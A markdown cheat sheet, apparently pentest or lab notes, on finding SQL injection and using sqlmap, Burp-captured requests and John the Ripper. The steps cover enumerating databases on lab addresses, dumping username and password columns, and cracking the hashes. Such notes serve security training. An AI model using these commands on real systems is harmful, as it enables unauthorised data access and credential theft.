# Check if vulnerable to SQL Injection

To check if a site is vulnerable to SQLi, run in a search bar:
```
' OR 1=1 --
```

OR you can run:
```
' 1=1 #
```

# Commands

Get DBS Schema:
```
sqlmap <options-URL-Or_Save-File> --dbs
```

Get tables:
```
sqlmap <options-URL-Or_Save-File> -D <database> --tables
```

View tables:
```
sqlmap <options-URL-Or_Save-File> -D <database> -T <tableName>
```

Show table colums:
```
sqlmap <options-URL-Or_Save-File> -D <database> -T <tableName> --columns
```

Show only certain columns, e.g.: username and password:
```
sqlmap <options-URL-Or_Save-File> -D <database> -T <tableName> -C username,password
```

Dump the data:
```
sqlmap <options-URL-Or_Save-File> -D <database> -T <tableName> -C username,password --dump
```

You can crack the password(s) using john, crackstation.net, hydra, etc.


## Check URL
Have a look at the URL, if it has something like /?nid= or if it jsut returns with something like results.php with no vaiables.

If it does have variables, follow Method 1, if it does not, follow Method 2
# Method 1

If you have a URL like the below example:
```
http://10.50.10.139/?nid=1
```

Try running sqlmap to see if you can get any vulnerabilities:
```
sqlmap -u 'http://10.50.10.139/?nid=1'
```

If you find any vulnerabilities, try to do some enumeration:
```
sqlmap -u 'http://10.50.10.139/?nid=1' --dbs
```

In the above example it returned with MySQL DB schema on possibel databases.
Example output:
```
available databases [2]:
[*] d7db
[*] information_schema
```

Now let's have a look at the tables for database d7db:
```
sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db --tables
```

Lets see what columns there are:
```
sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db -T users --columns
```

Now lets the dump the table "users" from the database d7db
```
sqlmap -u 'http://10.50.10.139/?nid=1' -D d7db -T users --dump
```

You can now copy the username and passwords to a text file and run john the ripper to crack it
```
john users.has --wordlist=/usr/share/wordlists/rockyou.txt
```

# Method 2 

Using file capture from BurpSuite
To check if a site is vulnerable to SQLi, run in a search bar:
```
' OR 1=1 #

# OR you can :

' OR 1=1 #
```

Open BurpSuite and enable proxy on your browser.
Next set Intercept = on
Do a search on the site, capture the response.
In the window below, r-click and select save to file.

e.g.: Output that you save to file:
```
POST /results.php HTTP/1.1
Host: 10.50.10.140
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 11
Origin: http://10.50.10.140
Connection: keep-alive
Referer: http://10.50.10.140/search.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

search=mary
```

Save the output to "check.txt"

### SQLmap using saved file
Bacause you know it's vulnerable to SQL injection, you can run SQLmap
```
sqlmap -r check.txt --dbs
```
